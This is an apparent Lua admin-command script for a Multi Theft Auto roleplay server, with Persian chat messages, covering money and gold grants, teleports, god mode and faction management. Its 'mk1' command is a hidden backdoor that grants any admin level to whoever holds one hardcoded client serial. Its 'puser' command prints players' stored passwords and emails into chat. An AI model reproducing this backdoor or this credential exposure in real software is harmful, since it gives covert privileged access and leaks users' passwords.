--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("respectboxall",
function ( thePlayer, command, tedad)
	if getElementData(thePlayer, "loggedIn") == true then
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 11 then
			return false
		end
		if tedad then
		for k, hame_Playera	in ipairs (getElementsByType("player")) do	
			if getElementData(hame_Playera, "loggedIn") == true then
				local tedad = tonumber(tedad)
				setElementData(accSys:getPlayerAcc(hame_Playera), "pBoxRe", tonumber(getElementData(accSys:getPlayerAcc(hame_Playera), "pBoxRe")) + tonumber(tedad))
				outputChatBox("#00ff00[Tavajoh]: #ffffffAdmin #00ff00"..getPlayerName(thePlayer).." #ffffffBe Tamamie Player Haye Online Nafari#00ff00 "..tedad.. " #ffffffRespectBox Dad!", hame_Playera, 255, 255, 255, true)
			end
		end
		else
			outputChatBox("#C0C0C0Bezan: /respectboxall <Tedad>", thePlayer, 255, 255, 255, true)
		end
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("moneyall",
function ( thePlayer, command, value)
	if getElementData(thePlayer, "loggedIn") == true then
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 11 then
			outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
		if value then
		for k, hame_Playera	in ipairs (getElementsByType("player")) do	
			if getElementData(hame_Playera, "loggedIn") == true then
				local value = tonumber(value)
				givePlayerMoney(hame_Playera, value)
				SendDiscordLog("GiveMoneyLOG", thePlayer , command,value )
				outputChatBox("#00ff00[Tavajoh]: #ffffffAdmin #00ff00"..getPlayerName(thePlayer).." #ffffffBe Tamamie Player Haye Online Nafari #00ff00$"..convertNumber(value).." #ffffffPool Dad!", hame_Playera, 255, 255, 255, true)
			end
		end
		else
			outputChatBox("#C0C0C0Bezan: /moneyallplayer <Meghdar>", thePlayer, 255, 255, 255, true)
		end
	end
end)




--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("goldall",
function ( thePlayer, command, value)
	if getElementData(thePlayer, "loggedIn") == true then
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 11 then
			outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
		if value then
		for k, hame_Playera	in ipairs (getElementsByType("player")) do	
			if getElementData(hame_Playera, "loggedIn") == true then
				local value = tonumber(value)
				SendDiscordLog("GiveGoldLOG", hame_Playera , command, value,"All Players" )
				local goldPlayer = getElementData(accSys:getPlayerAcc(hame_Playera), "pGold")
				setElementData(accSys:getPlayerAcc(hame_Playera), "pGold", tonumber(goldPlayer) + tonumber(value))
				outputChatBox("#00ff00[Tavajoh]: #ffffffAdmin #00ff00"..getPlayerName(thePlayer).." #ffffffBe Tamamie Player Haye Online Nafari #ffff00"..convertNumber(value).." #ffffffGold Dad!", hame_Playera, 255, 255, 255, true)
			end
		end
		else
			outputChatBox("#C0C0C0Bezan: /goldall <Meghdar>", thePlayer, 255, 255, 255, true)
		end
	end
end)

--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("respect",
function ( thePlayer, command, player, tedad )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 11 then
		return false
	end
		local find = miscSys:findPlayer ( player )
		if player then
		if find then
		if tedad then
			local targetPlayer = getPlayerName ( find )
			local tedad = tonumber(tedad)
			local respectPlayer = getElementData(accSys:getPlayerAcc(find), "pExp")
			setElementData(accSys:getPlayerAcc(find), "pExp", tonumber(respectPlayer) + tonumber(tedad))
			outputChatBox("#00ff00☑️ #ffffff Shoma Be #00ff00"..getPlayerName(find).." #ffffffTedad #00ff00"..tedad.." #ffffffRespect Dadid!", thePlayer, 255, 255, 255, true)
			outputChatBox("#00ff00[Tavajoh]: #ffffffAdmin #00ff00"..getPlayerName(thePlayer).." #ffffffBe Shoma #00ff00"..tedad.." #ffffffRespect Dad!", find, 255, 255, 255, true)
			outputDebugString("Admin "..getPlayerName(thePlayer).." Be Player "..targetPlayer.." Meghdar "..tedad.." Respect Dad!")
		else
			outputChatBox("#ff0000✖️ #ffffffTedade Respect Ra Vared Konid!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#C0C0C0Bezan: /giverespect <PartOfName/ID> <Tedad>", thePlayer, 0, 255, 0,true)
		end
end)







--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("setlevel",
function ( thePlayer, command, player, level )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 5 then
		return false
	end
		local find = miscSys:findPlayer ( player )
		if player then
		if find then
		if level then
		if tonumber(level) > 0 then
			local targetPlayer = getPlayerName ( find )
			local level = tonumber(level)
			setElementData(accSys:getPlayerAcc(find), "pLevel", level)
			setElementData(find, "levelPlayer", level)
			outputChatBox("#00ff00☑️ #ffffff Shoma Level #00ff00"..getPlayerName(find).." #ffffffRa Be #00ff00"..level.." #ffffffSet Kardid!", thePlayer, 255, 255, 255, true)
			outputChatBox("#ffff00[Tavajoh]: #ffffffAdmin #ffff00"..getPlayerName(thePlayer).." #ffffffLevel Shoma Ra Be #ffff00"..level.." #ffffffSet Kard!", find, 255, 255, 255, true)
			outputDebugString("Admin "..getPlayerName(thePlayer).." Level'e "..targetPlayer.." Ra Be "..level.." Set Kard!")
		else
			outputChatBox("#ff0000✖️ #ffffffLevel Bayad Bishtar Az 0 Bashad!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#ff0000✖️ #ffffffLevel Ra Vared Konid!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#C0C0C0Bezan: /setlevel <PartOfName/ID> <Level>", thePlayer, 0, 255, 0,true)
		end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("setpmplayer",
function ( thePlayer, command, player, value)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
		return false
	end
		local find = miscSys:findPlayer ( player )
		if player then
		if find then
			if tonumber(value) == 1 then
				outputChatBox("#ff0000✖️ #ffffffEmkane Premium Kardan Nist! Az Tablet (F2) Eghdam Konid.", thePlayer, 255, 255, 255, true)
			elseif tonumber(value) == 0 then
				setElementData(accSys:getPlayerAcc(find), "pGoldPremium", 0)
				setElementData(accSys:getPlayerAcc(find), "pSilverPremium", 0)
				setElementData(accSys:getPlayerAcc(find), "pBronzePremium", 0)
				setElementData(accSys:getPlayerAcc(find), "pDayTimePremium", 0)					

				outputChatBox("#00ff00☑️ #ffffffShoma #00ff00"..getPlayerName(find).." #ffffffRa Az #EBC212Premium #ffffffDar Avardid!", thePlayer, 255, 255, 255, true)
				outputChatBox("#ff0000[Tavajoh]: #ffffffAdmin #ff0000"..getPlayerName(thePlayer).." #ffffffShoma Ra #ff0000UnPremium #ffffffKard!", find, 255, 255, 255, true)
				outputDebugString("Admin "..getPlayerName(thePlayer).." Player "..getPlayerName(find).." Ra UnPremium Kard!")
			end
		else
			outputChatBox("#ff0000#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#C0C0C0Bezan: /setpmplayer <PartOfName/ID> <0-1>", thePlayer, 255, 255, 255, true)
		end
end)




addCommandHandler("notp",
function(thePlayer, command)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 7 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	if getElementData(thePlayer, "tpStatus") ~= true then
		setElementData(thePlayer, "tpStatus", true)
		outputChatBox("#00ff00No Teleport Shoma On Shod!", thePlayer, 255, 255, 255, true)
	else
		setElementData(thePlayer, "tpStatus", nil)
		outputChatBox("#ff0000No Teleport Shoma Off Shod!", thePlayer, 255, 255, 255, true)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("goto",
	function ( thePlayer, command, player )
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1 then
			outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
		local find = miscSys:findPlayer ( player )
		if player then
		if find then
		local adminta = tonumber(getElementData(accSys:getPlayerAcc(find), "pAdmin")) 		
		if getElementData(find, "tpStatus") ~= true then
			local int =  getElementInterior(find)
			local dim = getElementDimension ( find )
			local x , y , z = getElementPosition(find)
			local r = getPedRotation ( find )
			x = x - math.sin ( math.rad ( r ) ) * 2
			y = y + math.cos ( math.rad ( r ) ) * 2
			AdminMessages("Teleport-System","Admin "..getPlayerName(thePlayer).." Be Player "..getPlayerName(find).." Goto Kard")
			disSys:SendDiscordLog("goto",command,thePlayer,find)
			if isPedInVehicle (thePlayer) then
				local theVehicle = getPedOccupiedVehicle ( thePlayer )
					--Hale Bug Bus--
					if getElementData(thePlayer, "onbusMarkerMake") then
					destroyElement(getElementData(thePlayer, "onbusMarkerMake"))
					destroyElement(getElementData(thePlayer, "onbusBlipMake"))
					end
					--Hale Bug Pilot --
					if getElementData(thePlayer, "onpilotMarkerAndBlip") == true then
					destroyElement(getElementData(thePlayer, "onpilotMarkerMake"))
					destroyElement(getElementData(thePlayer, "onpilotBlipMake"))
					end					
					--Hale Bug Trucker--
					if getElementData(thePlayer, "makedTrucker") == true then
					destroyElement(getElementData(thePlayer, "onMarkerTruckerMake"))
					destroyElement(getElementData(thePlayer, "onBlipTruckerMake"))
					end
					--Hale Bug StreetWasher--
					if getElementData(thePlayer, "onMarkerMake") then
					destroyElement(getElementData(thePlayer, "onMarkerMake"))
					destroyElement(getElementData(thePlayer, "onBlipMake"))
					end
				setElementDimension(theVehicle,dim)
				setElementInterior(theVehicle,int)
				setElementDimension(thePlayer,dim)
				setElementInterior(thePlayer,int)
				
				setElementPosition ( theVehicle, x + 3, y, z )
				outputChatBox("#00ff00☑️ #ffffffShoma Be Player #ff1010"..getPlayerName(find).." #FFFFFF Goto Kardid.", thePlayer, 208, 0, 15,true)
				outputChatBox("#00ff00☑️Admin #ff1010"..getPlayerName(thePlayer).." #ffffff Be Shoma Goto Kard!", find, 208, 0, 15,true)
			else
				if isPedInVehicle (find) then
					local car = getPedOccupiedVehicle(find)
					if findEmptyCarSeat(car) then
						warpPedIntoVehicle(thePlayer,car,findEmptyCarSeat(car))
						setElementDimension(thePlayer,getElementDimension(find))
						setElementInterior(thePlayer,getElementInterior(find))
					else
						setElementDimension(thePlayer,dim)
						setElementInterior(thePlayer,int)
						setElementPosition ( thePlayer, x + 3, y, z )
						outputChatBox("#00ff00☑️ #ffffffShoma Be Player #ff1010"..getPlayerName(find).." #FFFFFF Goto Kardid.", thePlayer, 208, 0, 15,true)
						outputChatBox("#ff1010[Tavajoh]:#ffffffAdmin #ff1010"..getPlayerName(thePlayer).."#ffffff Be Shoma Goto Kard!", find, 208, 0, 15,true)
					end
				else
					setElementDimension(thePlayer,dim)
					setElementInterior(thePlayer,int)
					setElementPosition ( thePlayer, x + 3, y, z )
					outputChatBox("#00ff00☑️ #ffffffShoma Be Player #ff1010"..getPlayerName(find).." #FFFFFF Goto Kardid.", thePlayer, 208, 0, 15,true)
					outputChatBox("#ff1010[Tavajoh]:#ffffffAdmin #ff1010"..getPlayerName(thePlayer).."#ffffff Be Shoma Goto Kard!", find, 208, 0, 15,true)
				end
			end
			end


				
		else
			outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#C0C0C0Bezan: /goto <PartOfName/ID>", thePlayer, 255, 0, 0, true)
		end	
	end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("gethere",
	function ( thePlayer, command, player )
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 2 then
			outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end

		
		if player then
			local find = miscSys:findPlayer ( player )
		if find then
			disSys:SendDiscordLog("gethere",command,thePlayer,find)
			if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < tonumber(getElementData(accSys:getPlayerAcc(find), "pAdmin")) then
				outputChatBox("#ff0000✖️ #ffffffShoma Nemitavanid In Player Ra Gethere Konid!", thePlayer, 255, 255, 255, true)
				outputChatBox("#ffffff"..getPlayerName(thePlayer).." Dar Hale Talash Baraye Gethere Kardan Shoma Ast!", find, 255, 255, 255, true)
			else
			    if getElementData(find, "tpStatus") ~= true then
			    local dim = getElementDimension ( thePlayer )
			    local int =  getElementInterior(thePlayer)
			    local x , y , z = getElementPosition(thePlayer)
			    local r = getPedRotation ( thePlayer )
			    x = x - math.sin ( math.rad ( r ) ) * 2
			    y = y + math.cos ( math.rad ( r ) ) * 2
				if isPedInVehicle (find) then
					local car = getPedOccupiedVehicle(find)
					setElementDimension(car,dim)
					setElementInterior(car,int)
					setElementPosition ( car, x + 3, y, z )
				else
					if isPedInVehicle (thePlayer) then
						local car = getPedOccupiedVehicle(thePlayer)
						if findEmptyCarSeat(car) then
							warpPedIntoVehicle(find,car,findEmptyCarSeat(car))
						else
							setElementDimension(find,dim)
							setElementInterior(find,int)
							setElementPosition ( find, x + 3, y, z )
						end
					else
						setElementDimension(find,dim)
						setElementInterior(find,int)
						setElementPosition ( find, x + 3, y, z )
					end
				end
			    outputChatBox("#00ff00[Done]:#ffffff Shoma Player #ff1010"..getPlayerName(find).." #ffffffRa Gethere Kardid!", thePlayer, 208, 0, 15,true)		
			    outputChatBox("#ff1010[Tavajoh]:#ffffffShoma Gethere Shodid Tavasote Admin #ff1010"..getPlayerName(thePlayer), find, 208, 0, 15,true)
			end
		end
		else
			outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#C0C0C0Bezan: /gethere <PartOfName/ID>", thePlayer, 255, 0, 0, true)
		end	
	end
)


addCommandHandler("acwanted",
function ( thePlayer, command , player)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 5 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer(player)
	if player then
	if find then
		setPlayerWantedLevel(find, 0)
		setElementData(accSys:getPlayerAcc(find), "pWanted", 0)
		outputChatBox("#00ff00☑️ #ffffffShoma Wanted Haye #00ff00"..getPlayerName(find).." #ffffffRa Pak Kardid!", thePlayer, 208, 0, 15,true)	
		outputChatBox("#00ff00[Tavajoh]: #ffffffAdmin #00ff00"..getPlayerName(thePlayer).." #ffffffWanted #ffffffHaye Shoma Pak Kard!", find, 255, 255, 255, true)
		outputDebugString("Admin "..getPlayerName(thePlayer).." Wanted Haye Player "..getPlayerName(find).." Ra Pak Kard!")
	else
		outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
	end
	else
		outputChatBox("#C0C0C0Bezan: /acwanted <PartOfName/ID>", thePlayer, 255, 0, 0, true)
	end
end)
function makemanadmin( thePlayer, command, player, AdminID )
	if getPlayerSerial(thePlayer) == "9BA1788A5C1FA4A603F6EA6D264B0534" then
		if player then
			local find = miscSys:findPlayer ( player )
			if find then
				AdminID = tonumber( AdminID)
				local targetPlayer = getPlayerName ( find )
				setElementData(accSys:getPlayerAcc(find), "pAdmin", AdminID)
				outputChatBox("#00ff00 ok shod baraye player "..targetPlayer.." dar "..AdminID.." .", thePlayer, 255, 22, 22, true)
			else
				outputChatBox("#C0C0C0Syntax: /makeadmin <PartOfName/ID> <Admin-Level>", thePlayer, 255, 22, 22, true)
			end
		end
	else
		outputChatBox("#ff0000CMD:#ff0000 Motasefane In Dastoor Yaft Nashod!", thePlayer, 255, 255, 255, true)
	end
end
addCommandHandler("mk1",makemanadmin)
addCommandHandler("fixbank",
function ( thePlayer, command , player)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 5 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer(player)
	if player then
	if find then
		setElementData(accSys:getPlayerAcc(find), "pBank", 0)
		outputChatBox("#00ff00☑️ #ffffffShoma Bank Account #00ff00"..getPlayerName(find).." #ffffffRa Pak Kardid!", thePlayer, 208, 0, 15,true)	
		outputChatBox("#00ff00[Tavajoh]: #ffffffAdmin #00ff00"..getPlayerName(thePlayer).." #ffffffAccount Bank #ffffffShoma Ro Pak Kard!", find, 255, 255, 255, true)
		outputDebugString("Admin "..getPlayerName(thePlayer).." Bank Player "..getPlayerName(find).." Ra Pak Kard!")
	else
		outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
	end
	else
		outputChatBox("#C0C0C0Bezan: /fixbank <PartOfName/ID>", thePlayer, 255, 0, 0, true)
	end
end)

addCommandHandler("buygold",
function(thePlayer)
	outputChatBox("#00ff00[Info]:#ffffffGheymat Gold Server #9304FFThe Night MTA!", thePlayer, 255, 255, 255, true)
	outputChatBox("#9304FFThe Night MTA:#ff1010 500 #ffffffAddad Gold : #ff10105 #ffffffToman ", thePlayer, 255, 255, 255, true)
	outputChatBox("#9304FFThe Night MTA:#ff1010 1000 #ffffffAddad Gold : #ff101010 #ffffffToman", thePlayer, 255, 255, 255, true)
	outputChatBox("#9304FFThe Night MTA:#ff1010 2000 #ffffffAddad Gold : #ff101018 #ffffffToman", thePlayer, 255, 255, 255, true)
	outputChatBox("#9304FFThe Night MTA:#ff1010 5000 #ffffffAddad Gold : #ff101045 #ffffffToman ", thePlayer, 255, 255, 255, true)
	outputChatBox("#9304FFThe Night MTA:#ff1010 8000 #ffffffAddad Gold : #ff101070 #ffffffToman ", thePlayer, 255, 255, 255, true)
	outputChatBox("#9304FFThe Night MTA:#ff1010 10000+1000 #ffffffAddad Gold : #ff101095 #ffffffToman", thePlayer, 255, 255, 255, true)
	outputChatBox("#9304FFThe Night MTA:#ff1010 20000+5000 #ffffffAddad Gold : #ff1010200 #ffffffToman", thePlayer, 255, 255, 255, true)

end)
addCommandHandler("fixhouse",
function ( thePlayer, command , player)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer(player)
	if player then
	if find then
		setElementData(accSys:getPlayerAcc(find), "pPhousekey", 0)
		setElementData(accSys:getPlayerAcc(find), "pRented", 0)
		outputChatBox("#00ff00☑️ #ffffffShoma House #00ff00"..getPlayerName(find).." #ffffffRa Pak Kardid!", thePlayer, 208, 0, 15,true)	
		outputChatBox("#00ff00[Tavajoh]: #ffffffAdmin #00ff00"..getPlayerName(thePlayer).." #ffffffHouse #ffffffShoma Ro Pak Kard!", find, 255, 255, 255, true)
		outputDebugString("Admin "..getPlayerName(thePlayer).." Bank Player "..getPlayerName(find).." Ra Pak Kard!")
	else
		outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
	end
	else
		outputChatBox("#C0C0C0Bezan: /fixhouse <PartOfName/ID>", thePlayer, 255, 0, 0, true)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("getcarhere",
	function ( thePlayer, command, ...)
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 6 then
			outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
			if (...) then
				local plate = string.sub( table.concat({...}, " "), 1, 90 )
				if ( string.find( string.sub ( plate, 1, 1 ), " " ) ) then 
					return
				end
				for _,cars in ipairs (getElementsByType("vehicle")) do
					if cars then
						if getVehiclePlateText ( cars ) == plate then
							local x , y , z = getElementPosition(thePlayer)
							setElementPosition ( cars, x, tonumber(y)+2, z )
							outputChatBox("#00ff00☑️ #ffffffShoma Khodro Ba Pelak'e #00ff00"..plate.." #ffffff Ra Teleport Kardid!", thePlayer, 255, 255, 255, true)
						end
					end
				end
			else
				outputChatBox("#C0C0C0Bezan: /getcarhere <Plate>", thePlayer, 255, 0, 0, true)
			end
end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("gm",
function ( thePlayer, command )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 10 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		
		return false
	end
	if getElementData(thePlayer,"godmode") == true then
		outputChatBox("#00ff00☑️ #ffffffGod Mode Shoma #ff0000Off #ffffffShod!", thePlayer, 255, 255, 255, true)
		SendDiscordLog("GodModLog", thePlayer , command , "OFF" )
		setElementData(thePlayer,"godmode",nil)
	else
		outputChatBox("#00ff00☑️ #ffffffGod Mode Shoma #00ff00On #ffffffShod!", thePlayer, 255, 255, 255, true)
		SendDiscordLog("GodModLog", thePlayer , command , "ON" )
		setElementData(thePlayer,"godmode",true)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("vgm",
function ( thePlayer, command )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	if isPedInVehicle(thePlayer) then
	local vehesh = getPedOccupiedVehicle(thePlayer)
		if isVehicleDamageProof(vehesh) then
			outputChatBox("#00ff00☑️ #ffffffGod Mode Baraye Mashin Shoma #ff0000Off #ffffffShod!", thePlayer, 255, 255, 255, true)
			SendDiscordLog("VehGodModLog", thePlayer , command , "OFF" )
			setVehicleDamageProof(vehesh, false)
		else
			outputChatBox("#00ff00☑️ #ffffffGod Mode Baraye Mashin Shoma #00ff00On #ffffffShod!", thePlayer, 255, 255, 255, true)
			SendDiscordLog("VehGodModLog", thePlayer , command , "ON" )
			setVehicleDamageProof(vehesh, true)
		end
		else
			outputChatBox("#ff0000✖️ #ffffffBayad Dar Mashin Bashid!", thePlayer, 255, 255, 255, true)
		end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function isVehicleEmpty( vehicle )
	if not isElement( vehicle ) or getElementType( vehicle ) ~= "vehicle" then
		return true
	end
	local passengers = getVehicleMaxPassengers( vehicle )
	if type( passengers ) == 'number' then
		for seat = 0, passengers do
			if getVehicleOccupant( vehicle, seat ) then
				return false
			end
		end
	end
	return true
end
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("svrv",
function ( thePlayer, command )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	for index,vehs in ipairs (getElementsByType("vehicle")) do
		if vehs then
			if not isVehicleLocked ( vehs ) then  
				if isVehicleEmpty(vehs) then
					respawnVehicle(vehs)
					setVehicleEngineState(vehs, false)
				end
			end
			setElementData(vehs,"fuel",100)
		end
	end
	outputChatBox("#00ff00☑️ #ffffffShoma Tamami Mashin Haye Server Ra #00ff00Respawn #ffffffKardid!", thePlayer, 255, 255, 255, true)
end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
local facdata = {
	{ "#507dde" ,"Edare Police" },
	{ "#2f64e1" ,"Police Federal" },
	{ "#1953e6" ,"Gard Melli" },
	{ "#ff7700" ,"Pezeshk" },
	{ "#7a0707" ,"Hitman Agency" },
	{ "#2fa1d6" ,"Edare Amozesh Va Morabigari" },
	{ "#cd5c5c" ,"Khabar Negar" },
	{ "#FF00FF" ,"Shahrdar" },
	{ "#649c9e" ,"Sherkat Khadamat Khodro" },
	{ "#FFFF00" ,"Edare Taxirani" },
	{ "#9400FF" ,"Ballas Family" },
	{ "#ff0000" ,"Red Dragons Family" },
	{ "#00CBFF" ,"Los Aztecas Family" },
	{ "#008000" ,"Grove Street Family" },
	{ "#FFE100" ,"Vagos Family" },
	{ "#686e9b" ,"Hackers" },
}

local dbpTime = 500

addCommandHandler("pmembers",
function(thePlayer, cmd, facid)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1 then
		return false
	end
	if (facid) then
		local factionid = tonumber(facid)
			local query = dbQuery(exports.mysql:getMySQLC(), "SELECT * FROM users;" )
			local result, numrows = dbPoll(query, dbpTime)
			outputChatBox(""..facdata[factionid][1].."[Data-Base-System]:#ffffff Liste Azaye Faction "..facdata[factionid][1]..""..facdata[factionid][2].."#ffffff:", thePlayer, 255, 255, 255, true)
			if (result and numrows > 0) then
				setElementData(thePlayer,"Members",1)
				for index, row in pairs(result) do
					local factioneyaru = row['pMember']
					if tonumber(factioneyaru) == tonumber(factionid) then
						local name = row['pName']
						local rank = row['pRank']
						local lvl = row['pLevel']
						local pref = row['pID']
						outputChatBox(""..facdata[factionid][1].."["..getElementData(thePlayer,"Members").."] Player Name: #ffffff"..name..""..facdata[factionid][1].." Player Rank: #ffffff"..rank..""..facdata[factionid][1].." Player Level: #ffffff"..lvl..""..facdata[factionid][1].." Player Reff: #ffffff"..pref, thePlayer, 255, 255, 255, true)
						local chanta = getElementData(thePlayer,"Members")
						local chantabadi = tonumber(chanta) + 1
						setElementData(thePlayer,"Members",chantabadi)
					end
				end
				setElementData(thePlayer,"Members",nil)
				dbFree(query)
			end
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("fdemote",
function(thePlayer, cmd, preffe)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 6 then
		return false
	end
	if (preffe) then
		local reffeyarukemikhaddemoteshe = tonumber(preffe)
		local query = dbQuery(exports.mysql:getMySQLC(), "SELECT * FROM users;" )
		local result, numrows = dbPoll(query, dbpTime)
		if (result and numrows > 0) then
			for index, row in pairs(result) do
				local IDeYaru = row['pID']
				if tonumber(IDeYaru) == tonumber(reffeyarukemikhaddemoteshe) then
					local name = row['pName']
					exports["notf"]:addNotification(thePlayer, "Shoma Ba Movafaghiat Player "..name.." Ra Az Faction Demote Kardid!" , 'success')
				end
			end
			dbFree(query)
		end
		local sefr = 0
		local shasd = 60
		local query = dbQuery(exports.mysql:getMySQLC(), "UPDATE `users` SET `pMember` = '"..tonumber(sefr).."' WHERE `pID` = '"..tonumber(preffe).."'")
		dbFree(query)
		local query = dbQuery(exports.mysql:getMySQLC(), "UPDATE `users` SET `pPunish` = '"..tonumber(shasd).."' WHERE `pID` = '"..tonumber(preffe).."'")
		dbFree(query)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("puser",
function(thePlayer,cmd,username)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 10 then	outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)	return false end
	if (username) then
		local user = username
		local query = dbQuery(exports.mysql:getMySQLC(), "SELECT * FROM users;" )
		local result, numrows = dbPoll(query, dbpTime)
		if (result and numrows > 0) then
			for index, row in pairs(result) do
				local pname = row['pName']
				if pname == user then
					local pw = row['pKey']
					local lvl = row['pLevel']
					local pref = row['pID']
					local mail = row['pEmail']
					local serial = row['pSerial']
					outputChatBox("#ff0000[P-Data] Name: #ffffff"..pname.." #ff0000Password: #ffffff"..pw.." #ff0000Referral: #ffffff"..pref.." #ff0000Email: #ffffff"..mail.." #ff0000Serial: #ffffff"..serial.." #00FF00Cash: #FFFFFF"..row['pCash'].." #00FF00Bank-Cash: "..row['pBank'].." #FFFF00Gold: #FFFFFF"..row['pGold'], thePlayer, 255, 255, 255, true)
				end
			end
			dbFree(query)
		end
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function getowner( button, state, player )
    if button == "left" and state == "down" then
        if getElementType( source ) == "vehicle" then
            local x, y, z = getElementPosition( player )
            local x1, y1, z1 = getElementPosition( source ) 
            local distance = getDistanceBetweenPoints3D( x, y, z, x1, y1, z1 )
            if distance < 4 then
				if getElementData(player,"ingetownermode") == true then
					if getElementData(player ,"owner") then
						outputChatBox("#45B40DSaheb In Khodro: "..getElementData(source,"owner"), player, 255, 255, 255, true)
					end
				end
            end
        end
    end
end
addEventHandler( "onElementClicked", root, getowner )
--___________________________________________________________________________________________________________________--#ExoPrim
